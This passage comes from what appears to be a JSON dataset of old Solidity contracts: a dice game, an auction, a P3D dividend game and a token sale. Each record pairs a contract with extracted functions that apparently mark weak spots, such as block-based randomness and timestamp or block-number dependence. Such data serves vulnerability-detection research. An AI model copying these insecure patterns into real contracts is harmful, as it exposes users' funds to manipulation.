}\n function ownerkill() public\n onlyOwner\n {\n ZTHTKN.transfer(owner, contractBalance);\n selfdestruct(owner);\n }\n function dumpdivs() public{\n ZethrBankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _finishBet(bool delete_it, address target) private {\nplayerRoll memory roll = playerRolls[target];\nrequire(roll.tokenValue > 0);\nuint result;\nif (block.number - roll.blockn > 255) {\nresult = 1000;\n} else {\nresult = random(100, roll.blockn, target) + 1;\n}\nuint rollUnder = roll.rollUnder;\nif (result < rollUnder) {\nuint profit = calculateProfit(roll.tokenValue, rollUnder);\ncontractBalance = contractBalance.sub(profit);\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\nsetMaxProfit();\nif (delete_it){\ndelete playerRolls[target];\n}\nZTHTKN.transfer(target, profit + roll.tokenValue);\n} else {\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\ncontractBalance = contractBalance.add(roll.tokenValue);\nsetMaxProfit();\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b58"
  },
  "filename": "2670.sol",
  "content": "pragma solidity ^0.4.0;\ncontract TwentyDollars {\n struct Bid {\n address owner;\n uint256 amount;\n }\n address owner;\n uint256 public gameValue;\n uint256 public gameEndBlock;\n Bid public highestBid;\n Bid public secondHighestBid;\n mapping (address => uint256) public balances;\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier onlyBiddingOpen() {\n require(block.number < gameEndBlock);\n _;\n }\n modifier onlyBiddingClosed() {\n require(biddingClosed());\n _;\n }\n modifier onlyHighestBidder() {\n require(msg.sender == highestBid.owner);\n _;\n }\n constructor() public payable {\n owner = msg.sender;\n gameValue = msg.value;\n gameEndBlock = block.number + 40000;\n }\n function bid() public payable onlyBiddingOpen {\n require(msg.value > highestBid.amount);\n balances[secondHighestBid.owner] += secondHighestBid.amount;\n secondHighestBid = highestBid;\n highestBid.owner = msg.sender;\n highestBid.amount = msg.value;\n gameEndBlock += 10;\n }\n function withdraw() public {\n uint256 balance = balances[msg.sender];\n require(balance > 0);\n balances[msg.sender] = 0;\n msg.sender.transfer(balance);\n }\n function winnerWithdraw() public onlyBiddingClosed onlyHighestBidder {\n address highestBidder = highestBid.owner;\n require(highestBidder != address(0));\n delete highestBid.owner;\n highestBidder.transfer(gameValue);\n }\n function ownerWithdraw() public onlyOwner onlyBiddingClosed {\n uint256 winnerAllocation = (highestBid.owner == address(0)) ? 0 : gameValue;\n owner.transfer(getContractBalance() - winnerAllocation);\n }\n function getMyBalance() public view returns (uint256) {\n return balances[msg.sender];\n }\n function getContractBalance() public view returns (uint256) {\n return address(this).balance;\n }\n function biddingClosed() public view returns (bool) {\n return block.number >= gameEndBlock;\n }\n function () public payable {\n bid();\n }\n}",
  "extract_feature": [
    "function biddingClosed() public view returns (bool) {\nreturn block.number >= gameEndBlock;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b59"
  },
  "filename": "2734.sol",
  "content": "pragma solidity ^0.4.24;\ncontract Owned {\n address public owner;\n address public newOwner;\n event OwnershipTransferred(address indexed _from, address indexed _to);\n constructor() public {\n owner = 0x0B0eFad4aE088a88fFDC50BCe5Fb63c6936b9220;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n require(msg.sender == newOwner);\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n newOwner = address(0);\n }\n}\ninterface HourglassInterface {\n function() payable external;\n function buy(address _playerAddress) payable external returns(uint256);\n function sell(uint256 _amountOfTokens) external;\n function reinvest() external;\n function withdraw() external;\n function exit() external;\n function dividendsOf(address _playerAddress) external view returns(uint256);\n function balanceOf(address _playerAddress) external view returns(uint256);\n function transfer(address _toAddress, uint256 _amountOfTokens) external returns(bool);\n function stakingRequirement() external view returns(uint256);\n}\ncontract DivMultisigHackable is Owned {\nHourglassInterface constant P3Dcontract_ = HourglassInterface(0xB3775fB83F7D12A36E0475aBdD1FCA35c091efBe);\nfunction buyp3d(uint256 amt) internal{\nP3Dcontract_.buy.value(amt)(this);\n}\nfunction claimdivs() internal{\nP3Dcontract_.withdraw();\n}\nstruct HackableSignature {\n address owner;\n uint256 hackingcost;\n uint256 encryption;\n}\nuint256 private ethtosend;\nuint256 private nexId;\nuint256 public totalsigs;\nmapping(uint256 => HackableSignature) public Multisigs;\nmapping(address => uint256) public lasthack;\naddress public contrp3d = 0xB3775fB83F7D12A36E0475aBdD1FCA35c091efBe;\nuint256 private div;\nuint256 private count;\nconstructor(uint256 amtsigs) public{\n for(nexId = 0; nexId < amtsigs;nexId++){\n Multisigs[nexId].owner = msg.sender;\n Multisigs[nexId].hackingcost = 1;\n Multisigs[nexId].encryption = 1;\n}\ntotalsigs = amtsigs;\n}\nevent onHarvest(\n address customerAddress,\n uint256 amount\n );\nfunction harvestabledivs()\n view\n public\n returns(uint256)\n {\n return ( P3Dcontract_.dividendsOf(address(this))) ;\n }\nfunction amountofp3d() external view returns(uint256){\n return ( P3Dcontract_.balanceOf(address(this))) ;\n}\nfunction Hacksig(uint256 nmbr) public payable{\n require(lasthack[msg.sender] < block.number);\n require(nmbr < totalsigs);\n require(Multisigs[nmbr].owner != msg.sender);\n require(msg.value >= Multisigs[nmbr].hackingcost + Multisigs[nmbr].encryption);\n Multisigs[nmbr].owner = msg.sender;\n Multisigs[nmbr].hackingcost ++;\n Multisigs[nmbr].encryption = 0;\n lasthack[msg.sender] = block.number;\n}\nfunction Encrypt(uint256 nmbr) public payable{\n require(Multisigs[nmbr].owner == msg.sender);\n Multisigs[nmbr].encryption += msg.value;\n }\nfunction HackDivs() public payable{\n div = harvestabledivs();\n require(msg.value >= 1 finney);\n require(div > 0);\n count = 0;\n for(nexId = 0; nexId < totalsigs;nexId++){\n if(Multisigs[nexId].owner == msg.sender){\n count++;\n }\n}\nrequire(count > totalsigs/2);\n claimdivs();\n ethtosend = div /100;\n owner.transfer(ethtosend);\n ethtosend = ethtosend * 99;\n msg.sender.transfer(ethtosend);\n emit onHarvest(msg.sender,ethtosend);\n}\nfunction Expand() public {\n ethtosend = this.balance /100;\n owner.transfer(ethtosend);\n buyp3d(this.balance);\n}\nfunction () external payable{}\n}",
  "extract_feature": [
    "function Hacksig(uint256 nmbr) public payable{\nrequire(lasthack[msg.sender] < block.number);\nrequire(nmbr < totalsigs);\nrequire(Multisigs[nmbr].owner != msg.sender);\nrequire(msg.value >= Multisigs[nmbr].hackingcost + Multisigs[nmbr].encryption);\nMultisigs[nmbr].owner = msg.sender;\nMultisigs[nmbr].hackingcost ++;\nMultisigs[nmbr].encryption = 0;\nlasthack[msg.sender] = block.number;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b5a"
  },
  "filename": "2736.sol",
  "content": "pragma solidity 0.4.24;\ninterface DisbursementHandlerI {\n function withdraw(address _beneficiary, uint256 _index) external;\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\ncontract DisbursementHandler is DisbursementHandlerI, Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20;\n struct Disbursement {\n uint256 timestamp;\n uint256 value;\n }\n event Setup(address indexed _beneficiary, uint256 _timestamp, uint256 _value);\n event TokensWithdrawn(address indexed _to, uint256 _value);\n ERC20 public token;\n uint256 public totalAmount;\n mapping(address => Disbursement[]) public disbursements;\n constructor(ERC20 _token) public {\n require(_token != address(0));\n token = _token;\n }\n function setupDisbursement(\n address _beneficiary,\n uint256 _value,\n uint256 _timestamp\n )\n external\n onlyOwner\n {\n require(block.timestamp < _timestamp);\n disbursements[_beneficiary].push(Disbursement(_timestamp, _value));\n totalAmount = totalAmount.add(_value);\n emit Setup(_beneficiary, _timestamp, _value);\n }\n function withdraw(address _beneficiary, uint256 _index)\n external\n {\n Disbursement[] storage beneficiaryDisbursements = disbursements[_beneficiary];\n require(_index < beneficiaryDisbursements.length);\n Disbursement memory disbursement = beneficiaryDisbursements[_index];\n require(disbursement.timestamp < now && disbursement.value > 0);\n delete beneficiaryDisbursements[_index];\n token.safeTransfer(_beneficiary, disbursement.value);\n emit TokensWithdrawn(_beneficiary, disbursement.value);\n }\n}\ninterface VaultI {\n function deposit(address contributor) external payable;\n function saleSuccessful() external;\n function enableRefunds() external;\n function refund(address contributor) external;\n function close() external;\n function sendFundsToWallet() external;\n}\nlibrary Math {\n function max64(uint64 a, uint64 b) internal pure returns (uint64) {\n return a >= b ? a : b;\n }\n function min64(uint64 a, uint64 b) internal pure returns (uint64) {\n return a < b ? a : b;\n }\n function max256(uint256 a, uint256 b) internal pure returns (uint256) {\n return a >= b ? a : b;\n }\n function min256(uint256 a, uint256 b) internal pure returns (uint256) {\n return a < b ? a : b;\n }\n}\ncontract Vault is VaultI, Ownable {\n using SafeMath for uint256;\n enum State { Active, Success, Refunding, Closed }\n uint256 public firstDepositTimestamp;\n mapping (address => uint256) public deposited;\n uint256 public disbursementWei;\n uint256 public disbursementDuration;\n address public trustedWallet;\n uint256 public initialWei;\n uint256 public nextDisbursement;\n uint256 public totalDeposited;\n uint256 public refundable;\n State public state;\n event Closed();\n event RefundsEnabled();\n event Refunded(address indexed contributor, uint256 amount);\n modifier atState(State _state) {\n require(state == _state);\n _;\n }\n constructor (\n address _wallet,\n uint256 _initialWei,\n uint256 _disbursementWei,\n uint256 _disbursementDuration\n )\n public\n {\n require(_wallet != address(0));\n require(_disbursementWei != 0);\n trustedWallet = _wallet;\n initialWei = _initialWei;\n disbursementWei = _disbursementWei;\n disbursementDuration = _disbursementDuration;\n state = State.Active;\n }\n function deposit(address _contributor) onlyOwner external payable {\n require(state == State.Active || state == State.Success);\n if (firstDepositTimestamp == 0) {\n firstDepositTimestamp = now;\n }\n totalDeposited = totalDeposited.add(msg.value);\n deposited[_contributor] = deposited[_contributor].add(msg.value);\n }\n function saleSuccessful()\n onlyOwner\n external\n atState(State.Active)\n {\n state = State.Success;\n transferToWallet(initialWei);\n }\n function enableRefunds() onlyOwner external {\n require(state != State.Refunding);\n state = State.Refunding;\n uint256 currentBalance = address(this).balance;\n refundable = currentBalance <= totalDeposited ? currentBalance : totalDeposited;\n emit RefundsEnabled();\n }\n function refund(address _contributor) external atState(State.Refunding) {\n require(deposited[_contributor] > 0);\n uint256 refundAmount = deposited[_contributor].mul(refundable).div(totalDeposited);\n deposited[_contributor] = 0;\n _contributor.transfer(refundAmount);\n emit Refunded(_contributor, refundAmount);\n }\n function close() external atState(State.Success) onlyOwner {\n state = State.Closed;\n nextDisbursement = now;\n emit Closed();\n }\n function sendFundsToWallet() external atState(State.Closed) {\n require(nextDisbursement <= now);\n if (disbursementDuration == 0) {\n trustedWallet.transfer(address(this).balance);\n return;\n }\n uint256 numberOfDisbursements = now.sub(nextDisbursement).div(disbursementDuration).add(1);\n nextDisbursement = nextDisbursement.add(disbursementDuration.mul(numberOfDisbursements));\n transferToWallet(disbursementWei.mul(numberOfDisbursements));\n }\n function transferToWallet(uint256 _amount) internal {\n uint256 amountToSend = Math.min256(_amount, address(this).balance);\n trustedWallet.transfer(amountToSend);\n }\n}\ninterface WhitelistableI {\n function changeAdmin(address _admin) external;\n function invalidateHash(bytes32 _hash) external;\n function invalidateHashes(bytes32[] _hashes) external;\n}\nlibrary ECRecovery {\n function recover(bytes32 hash, bytes sig)\n internal\n pure\n returns (address)\n {\n bytes32 r;\n bytes32 s;\n uint8 v;\n if (sig.length != 65) {\n return (address(0));\n }\n assembly {\n r := mload(add(sig, 32))\n s := mload(add(sig, 64))\n v := byte(0, mload(add(sig, 96)))\n }\n if (v < 27) {\n v += 27;\n }\n if (v != 27 && v != 28) {\n return (address(0));\n } else {\n return ecrecover(hash, v, r, s);\n }\n }\n function toEthSignedMessageHash(bytes32 hash)\n internal\n pure\n returns (bytes32)\n {\n return keccak256(\n \"\\x19Ethereum Signed Message:\\n32\",\n hash\n );\n }\n}\ncontract Whitelistable is WhitelistableI, Ownable {\n using ECRecovery for bytes32;\n address public whitelistAdmin;\n mapping(bytes32 => bool) public invalidHash;\n event AdminUpdated(address indexed newAdmin);\n modifier validAdmin(address _admin) {\n require(_admin != 0);\n _;\n }\n modifier onlyAdmin {\n require(msg.sender == whitelistAdmin);\n _;\n }\n modifier isWhitelisted(bytes32 _hash, bytes _sig) {\n require(checkWhitelisted(_hash, _sig));\n _;\n }\n constructor(address _admin) public validAdmin(_admin) {\n whitelistAdmin = _admin;\n }\n function changeAdmin(address _admin)\n external\n onlyOwner\n validAdmin(_admin)\n {\n emit AdminUpdated(_admin);\n whitelistAdmin = _admin;\n }\n function invalidateHash(bytes32 _hash) external onlyAdmin {\n invalidHash[_hash] = true;\n }\n function invalidateHashes(bytes32[] _hashes) external onlyAdmin {\n for (uint i = 0; i < _hashes.length; i++) {\n invalidHash[_hashes[i]] = true;\n }\n }\n function checkWhitelisted(\n bytes32 _rawHash,\n bytes _sig\n )\n public\n view\n returns(bool)\n {\n bytes32 hash = _rawHash.toEthSignedMessageHash();\n return !invalidHash[_rawHash] && whitelistAdmin == hash.recover(_sig);\n }\n}\ninterface EthPriceFeedI {\n function getUnit() external view returns(string);\n function getRate() external view returns(uint256);\n function getLastTimeUpdated() external view returns(uint256);\n}\ninterface SaleI {\n function setup() external;\n function changeEthPriceFeed(EthPriceFeedI newPriceFeed) external;\n function contribute(address _contributor, uint256 _limit, uint256 _expiration, bytes _sig) external payable;\n function allocateExtraTokens(address _contributor) external;\n function setEndTime(uint256 _endTime) external;\n function endSale() external;\n}\ncontract StateMachine {\n struct State {\n bytes32 nextStateId;\n mapping(bytes4 => bool) allowedFunctions;\n function() internal[] transitionCallbacks;\n function(bytes32) internal returns(bool)[] startConditions;\n }\n mapping(bytes32 => State) states;\n bytes32 private currentStateId;\n event Transition(bytes32 stateId, uint256 blockNumber);\n modifier checkAllowed {\n conditionalTransitions();\n require(states[currentStateId].allowedFunctions[msg.sig]);\n _;\n }\n function conditionalTransitions() public {\n bool checkNextState;\n do {\n checkNextState = false;\n bytes32 next = states[currentStateId].nextStateId;\n for (uint256 i = 0; i < states[next].startConditions.length; i++) {\n if (states[next].startConditions[i](next)) {\n goToNextState();\n checkNextState = true;\n break;\n }\n }\n } while (checkNextState);\n }\n function getCurrentStateId() view public returns(bytes32) {\n return currentStateId;\n }\n function setStates(bytes32[] _stateIds) internal {\n require(_stateIds.length > 0);\n require(currentStateId == 0);\n require(_stateIds[0] != 0);\n currentStateId = _stateIds[0];\n for (uint256 i = 1; i < _stateIds.length; i++) {\n require(_stateIds[i] != 0);\n states[_stateIds[i - 1]].nextStateId = _stateIds[i];\n require(states[_stateIds[i]].nextStateId == 0);\n }\n }\n function allowFunction(bytes32 _stateId, bytes4 _functionSelector)\n internal\n {\n states[_stateId].allowedFunctions[_functionSelector] = true;\n }\n function goToNextState() internal {\n bytes32 next = states[currentStateId].nextStateId;\n require(next != 0);\n currentStateId = next;\n for (uint256 i = 0; i < states[next].transitionCallbacks.length; i++) {\n states[next].transitionCallbacks[i]();\n }\n emit Transition(next, block.number);\n }\n function addStartCondition(\n bytes32 _stateId,\n function(bytes32) internal returns(bool) _condition\n )\n internal\n {\n states[_stateId].startConditions.push(_condition);\n }\n function addCallback(bytes32 _stateId, function() internal _callback)\n internal\n {\n states[_stateId].transitionCallbacks.push(_callback);\n }\n}\ncontract TimedStateMachine is StateMachine {\n event StateStartTimeSet(bytes32 indexed _stateId, uint256 _startTime);\n mapping(bytes32 => uint256) private startTime;\n function getStateStartTime(bytes32 _stateId) public view returns(uint256) {\n return startTime[_stateId];\n }\n function setStateStartTime(bytes32 _stateId, uint256 _timestamp) internal {\n require(block.timestamp < _timestamp);\n if (startTime[_stateId] == 0) {\n addStartCondition(_stateId, hasStartTimePassed);\n }\n startTime[_stateId] = _timestamp;\n emit StateStartTimeSet(_stateId, _timestamp);\n }\n function hasStartTimePassed(bytes32 _stateId) internal returns(bool) {\n return startTime[_stateId] <= block.timestamp;\n }\n}\ncontract TokenControllerI {\n function transferAllowed(address _from, address _to)\n external\n view\n returns (bool);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract ControllableToken is Ownable, StandardToken {\n TokenControllerI public controller;\n modifier isAllowed(address _from, address _to) {\n require(controller.transferAllowed(_from, _to));\n _;\n }\n function setController(TokenControllerI _controller) onlyOwner public {\n require(_controller != address(0));\n controller = _controller;\n }\n function transfer(address _to, uint256 _value)\n isAllowed(msg.sender, _to)\n public\n returns (bool)\n {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value)\n isAllowed(_from, _to)\n public\n returns (bool)\n {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract DetailedERC20 is ERC20 {\n string public name;\n string public symbol;\n uint8 public decimals;\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n}\ncontract Token is ControllableToken, DetailedERC20 {\n constructor(\n uint256 _supply,\n string _name,\n string _symbol,\n uint8 _decimals\n ) DetailedERC20(_name, _symbol, _decimals) public {\n require(_supply != 0);\n totalSupply_ = _supply;\n balances[msg.sender] = _supply;\n emit Transfer(address(0), msg.sender, _supply);\n }\n}\ncontract Sale is SaleI, Ownable, Whitelistable, TimedStateMachine, TokenControllerI {\n using SafeMath for uint256;\n using SafeERC20 for Token;\n bytes32 private constant SETUP = \"setup\";\n bytes32 private constant FREEZE = \"freeze\";\n bytes32 private constant SALE_IN_PROGRESS = \"saleInProgress\";\n bytes32 private constant SALE_ENDED = \"saleEnded\";\n bytes32[] public states = [SETUP, FREEZE, SALE_IN_PROGRESS, SALE_ENDED];\n mapping(address => uint256) public unitContributions;\n mapping(address => bool) public extraTokensAllocated;\n DisbursementHandler public disbursementHandler;\n uint256 public totalContributedUnits = 0;\n uint256 public totalSaleCapUnits;\n uint256 public minContributionUnits;\n uint256 public minThresholdUnits;\n uint256 public saleTokensPerUnit;\n uint256 public extraTokensPerUnit;\n uint256 public tokensForSale;\n Token public trustedToken;\n Vault public trustedVault;\n EthPriceFeedI public ethPriceFeed;\n event Contribution(\n address indexed contributor,\n address indexed sender,\n uint256 valueUnit,\n uint256 valueWei,\n uint256 excessWei,\n uint256 weiPerUnitRate\n );\n event EthPriceFeedChanged(address previousEthPriceFeed, address newEthPriceFeed);\n event TokensAllocated(address indexed contributor, uint256 tokenAmount);\n constructor (\n uint256 _totalSaleCapUnits,\n uint256 _minContributionUnits,\n uint256 _minThresholdUnits,\n uint256 _maxTokens,\n address _whitelistAdmin,\n address _wallet,\n uint256 _vaultInitialDisburseWei,\n uint256 _vaultDisbursementWei,\n uint256 _vaultDisbursementDuration,\n uint256 _startTime,\n string _tokenName,\n string _tokenSymbol,\n uint8 _tokenDecimals,\n EthPriceFeedI _ethPriceFeed\n )\n Whitelistable(_whitelistAdmin)\n public\n {\n require(_totalSaleCapUnits != 0);\n require(_maxTokens != 0);\n require(_wallet != 0);\n require(_minThresholdUnits <= _totalSaleCapUnits);\n require(_ethPriceFeed != address(0));\n require(now < _startTime);\n totalSaleCapUnits = _totalSaleCapUnits;\n minContributionUnits = _minContributionUnits;\n minThresholdUnits = _minThresholdUnits;\n trustedToken = new Token(\n _maxTokens,\n _tokenName,\n _tokenSymbol,\n _tokenDecimals\n );\n disbursementHandler = new DisbursementHandler(trustedToken);\n ethPriceFeed = _ethPriceFeed;\n trustedToken.setController(this);\n trustedVault = new Vault(\n _wallet,\n _vaultInitialDisburseWei,\n _vaultDisbursementWei,\n _vaultDisbursementDuration\n );\n setStates(states);\n allowFunction(SETUP, this.setup.selector);\n allowFunction(FREEZE, this.setEndTime.selector);\n allowFunction(SALE_IN_PROGRESS, this.setEndTime.selector);\n allowFunction(SALE_IN_PROGRESS, this.contribute.selector);\n allowFunction(SALE_IN_PROGRESS, this.endSale.selector);\n allowFunction(SALE_ENDED, this.allocateExtraTokens.selector);\n addStartCondition(SALE_ENDED, wasCapReached);\n setStateStartTime(SALE_IN_PROGRESS, _startTime);\n addCallback(SALE_ENDED, onSaleEnded);\n }\n function setup() external onlyOwner checkAllowed {\n trustedToken.safeTransfer(disbursementHandler, disbursementHandler.totalAmount());\n tokensForSale = trustedToken.balanceOf(this);\n require(tokensForSale >= totalSaleCapUnits);\n saleTokensPerUnit = tokensForSale.div(totalSaleCapUnits);\n goToNextState();\n }\n function changeEthPriceFeed(EthPriceFeedI _ethPriceFeed) external onlyOwner {\n require(_ethPriceFeed != address(0));\n emit EthPriceFeedChanged(ethPriceFeed, _ethPriceFeed);\n ethPriceFeed = _ethPriceFeed;\n }\n function contribute(\n address _contributor,\n uint256 _contributionLimitUnits,\n uint256 _payloadExpiration,\n bytes _sig\n )\n external\n payable\n checkAllowed\n isWhitelisted(keccak256(\n abi.encodePacked(\n _contributor,\n _contributionLimitUnits,\n _payloadExpiration\n )\n ), _sig)\n {\n require(msg.sender == _contributor);\n require(now < _payloadExpiration);\n uint256 weiPerUnitRate = ethPriceFeed.getRate();\n require(weiPerUnitRate != 0);\n uint256 previouslyContributedUnits = unitContributions[_contributor];\n uint256 currentContributionUnits = min256(\n _contributionLimitUnits.sub(previouslyContributedUnits),\n totalSaleCapUnits.sub(totalContributedUnits),\n msg.value.div(weiPerUnitRate)\n );\n require(currentContributionUnits != 0);\n require(currentContributionUnits >= minContributionUnits || previouslyContributedUnits != 0);\n unitContributions[_contributor] = previouslyContributedUnits.add(currentContributionUnits);\n totalContributedUnits = totalContributedUnits.add(currentContributionUnits);\n uint256 currentContributionWei = currentContributionUnits.mul(weiPerUnitRate);\n trustedVault.deposit.value(currentContributionWei)(msg.sender);\n if (totalContributedUnits >= minThresholdUnits &&\n trustedVault.state() != Vault.State.Success) {\n trustedVault.saleSuccessful();\n }\n uint256 excessWei = msg.value.sub(currentContributionWei);\n if (excessWei > 0) {\n msg.sender.transfer(excessWei);\n }\n emit Contribution(\n _contributor,\n msg.sender,\n currentContributionUnits,\n currentContributionWei,\n excessWei,\n weiPerUnitRate\n );\n uint256 tokenAmount = currentContributionUnits.mul(saleTokensPerUnit);\n trustedToken.safeTransfer(_contributor, tokenAmount);\n emit TokensAllocated(_contributor, tokenAmount);\n }\n function allocateExtraTokens(address _contributor)\n external\n checkAllowed\n {\n require(!extraTokensAllocated[_contributor]);\n require(unitContributions[_contributor] != 0);\n require(totalContributedUnits < totalSaleCapUnits);\n extraTokensAllocated[_contributor] = true;\n uint256 tokenAmount = unitContributions[_contributor].mul(extraTokensPerUnit);\n trustedToken.safeTransfer(_contributor, tokenAmount);\n emit TokensAllocated(_contributor, tokenAmount);\n }\n function setEndTime(uint256 _endTime) external onlyOwner checkAllowed {\n require(now < _endTime);\n require(getStateStartTime(SALE_ENDED) == 0);\n setStateStartTime(SALE_ENDED, _endTime);\n }\n function enableRefunds() external onlyOwner {\n trustedVault.enableRefunds();\n }\n function endSale() external onlyOwner checkAllowed {\n goToNextState();\n }\n function transferAllowed(address _from, address)\n external\n view\n returns (bool)\n {\n return _from == address(this) || _from == address(disbursementHandler);\n }\n function setupDisbursement(\n address _beneficiary,\n uint256 _tokenAmount,\n uint256 _duration\n )\n internal\n {\n require(tokensForSale == 0);\n disbursementHandler.setupDisbursement(\n _beneficiary,\n _tokenAmount,\n now.add(_duration)\n );\n }\n function wasCapReached(bytes32) internal returns (bool) {\n return totalSaleCapUnits <= totalContributedUnits;\n }\n function onSaleEnded() internal {\n trustedToken.transferOwnership(owner);\n if (totalContributedUnits == 0) {\n trustedToken.safeTransfer(trustedVault.trustedWallet(), tokensForSale);\n } else if (totalContributedUnits < minThresholdUnits) {\n trustedVault.enableRefunds();\n } else {\n extraTokensPerUnit = tokensForSale.div(totalContributedUnits).sub(saleTokensPerUnit);\n trustedVault.close();\n trustedVault.transferOwnership(owner);\n }\n }\n function min256(uint256 x, uint256 y, uint256 z) internal pure returns (uint256) {\n return Math.min256(x, Math.min256(y, z));\n }\n}\ncontract FoamSale is Sale {\n address private constant FOAM_WALLET = 0x3061CFBAe69Bff0f933353cea20de6C89Ab16acc;\n constructor()\n Sale(\n 24000000,\n 90,\n 1,\n 1000000000 * (10 ** 18),\n 0x8dAB5379f7979df2Fac963c69B66a25AcdaADbB7,\n FOAM_WALLET,\n 1 ether,\n 25000 ether,\n 0,\n 1532803878,\n \"FOAM Token\",\n \"FOAM\",\n 18,\n EthPriceFeedI(0x54bF24e1070784D7F0760095932b47CE55eb3A91)\n )\n public\n {\n setupDisbursement(FOAM_WALLET, 700000000 * (10 ** 18), 1 hours);\n }\n}",
  "extract_feature": [
    "function goToNextState() internal {\nbytes32 next = states[currentStateId].nextStateId;\nrequire(next != 0);\ncurrentStateId = next;\nfor (uint256 i = 0; i < states[next].transitionCallbacks.length; i++) {\nstates[next].transitionCallbacks[i]();\n}\nemit Transition(next, block.number);\n}",
    "function setStateStartTime(bytes32 _stateId, uint256 _timestamp) internal {\nrequire(block.timestamp < _timestamp);\nif (startTime[_stateId] == 0) {\naddStartCondition(_stateId, hasStartTimePassed);\n}\nstartTime[_stateId] = _timestamp;\nemit StateStartTimeSet(_stateId, _timestamp);\n}",
    "function hasStartTimePassed(bytes32 _stateId) internal returns(bool) {\nreturn startTime[_stateId] <= block.timestamp;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b5b"
  },
  "filename": "277.sol",
